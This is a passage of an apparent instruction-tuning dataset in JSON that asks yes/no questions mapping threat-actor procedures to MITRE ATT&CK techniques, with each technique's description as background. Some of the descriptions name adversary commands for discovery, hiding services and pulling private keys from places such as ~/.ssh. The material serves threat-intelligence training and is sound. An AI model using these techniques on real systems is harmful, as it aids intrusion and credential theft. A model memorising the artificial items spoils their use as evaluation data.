Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer..\nAnswer in Yes or No.\n\nQuestion: Is procedure JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.  related to technique Exploitation for Privilege Escalation",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exploitation for Privilege Escalation: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "question": "Is procedure JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.  related to technique Exploitation for Privilege Escalation",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Metador has encrypted their payloads.  related to technique Software Discovery: Security Software Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Encrypted/Encoded File: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "question": "Is procedure Metador has encrypted their payloads.  related to technique Software Discovery: Security Software Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure RCSession can write its configuration file to the Registry.  related to technique Modify Registry.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Modify Registry: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "question": "Is procedure RCSession can write its configuration file to the Registry.  related to technique Modify Registry",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings. a type of technique Create or Modify System Process: Windows Service.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Create or Modify System Process: Windows Service: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.",
      "question": "Is procedure Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings. a type of technique Create or Modify System Process: Windows Service",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Time Discovery: An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.\n\nOn network devices, Network Device CLI commands such as `show clock detail` can be used to see the current time configuration.\n\nIn addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.\n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time..\nQ: Is procedure BLUELIGHT can collect the local time on a compromised host. a type of technique System Time Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Time Discovery: An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.\n\nOn network devices, Network Device CLI commands such as `show clock detail` can be used to see the current time configuration.\n\nIn addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.\n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
      "question": "Is procedure BLUELIGHT can collect the local time on a compromised host. a type of technique System Time Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nQ: Is procedure MechaFlounder has the ability to run commands on a compromised host. a type of technique Unsecured Credentials: Private Keys.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure MechaFlounder has the ability to run commands on a compromised host. a type of technique Unsecured Credentials: Private Keys",
      "yes/no": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine..\nQ: Is procedure zwShell can obtain the victim PC name and OS version. a type of technique Account Discovery: Domain Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure zwShell can obtain the victim PC name and OS version. a type of technique Account Discovery: Domain Account",
      "yes/no": "No.\nThe provided context is related to System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Clop can search for processes with antivirus and antimalware product names.  related to technique Office Application Startup: Office Test",
    "context": "",
    "output": "No.\nThe correct answer is Software Discovery: Security Software Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Software Discovery: Security Software Discovery: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "question": "Is procedure Clop can search for processes with antivirus and antimalware product names.  related to technique Office Application Startup: Office Test",
      "yes/no": "No.\nThe correct answer is Software Discovery: Security Software Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background User Execution: Malicious File: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing..\nQ: Is procedure Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments.  related to technique Impair Defenses: Disable or Modify Tools.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is User Execution: Malicious File",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious File: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "question": "Is procedure Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments.  related to technique Impair Defenses: Disable or Modify Tools",
      "yes/no": "No.\nThe correct answer is User Execution: Malicious File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Software Discovery: Security Software Discovery: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform..\nAnswer in Yes or No.\n\nQuestion: Is procedure SideCopy uses a loader DLL file to collect AV product names from an infected host. a type of technique Automated Collection",
    "context": "",
    "output": "No.\nThe provided context is correlated with Software Discovery: Security Software Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Software Discovery: Security Software Discovery: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "question": "Is procedure SideCopy uses a loader DLL file to collect AV product names from an infected host. a type of technique Automated Collection",
      "yes/no": "No.\nThe provided context is correlated with Software Discovery: Security Software Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Dynamic Resolution: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control..\nQ: Is procedure Tomiris has connected to a signalization server that provides a URL and port, and then Tomiris sends a GET request to that URL to establish C2. a type of technique Dynamic Resolution.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Dynamic Resolution: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
      "question": "Is procedure Tomiris has connected to a signalization server that provides a URL and port, and then Tomiris sends a GET request to that URL to establish C2. a type of technique Dynamic Resolution",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure WellMail can identify the current username on the victim system.  related to technique System Owner/User Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "question": "Is procedure WellMail can identify the current username on the victim system.  related to technique System Owner/User Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS..\nQ: Is procedure Attor\u2019s plugin deletes the collected files and log files after exfiltration. a type of technique Remote Access Software.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure Attor\u2019s plugin deletes the collected files and log files after exfiltration. a type of technique Remote Access Software",
      "yes/no": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure REvil has infected victim machines through compromised websites and exploit kits.  related to technique Active Scanning: Vulnerability Scanning.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Drive-by Compromise",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Drive-by Compromise: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
      "question": "Is procedure REvil has infected victim machines through compromised websites and exploit kits.  related to technique Active Scanning: Vulnerability Scanning",
      "yes/no": "No.\nThe provided context is related to Drive-by Compromise",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure TA505 has used malware such as Azorult and Cobalt Strike in their operations. a type of technique Obtain Capabilities: Malware",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obtain Capabilities: Malware: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "question": "Is procedure TA505 has used malware such as Azorult and Cobalt Strike in their operations. a type of technique Obtain Capabilities: Malware",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Permission Groups Discovery: Domain Groups: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups..\nAnswer in Yes or No.\n\nQuestion: Is procedure ToddyCat has executed `net group \"domain admins\" /dom` for discovery on compromised machines. a type of technique Process Injection",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Permission Groups Discovery: Domain Groups: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
      "question": "Is procedure ToddyCat has executed `net group \"domain admins\" /dom` for discovery on compromised machines. a type of technique Process Injection",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Kinsing has searched for private keys.  related to technique Unsecured Credentials: Private Keys.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Unsecured Credentials: Private Keys: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "question": "Is procedure Kinsing has searched for private keys.  related to technique Unsecured Credentials: Private Keys",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
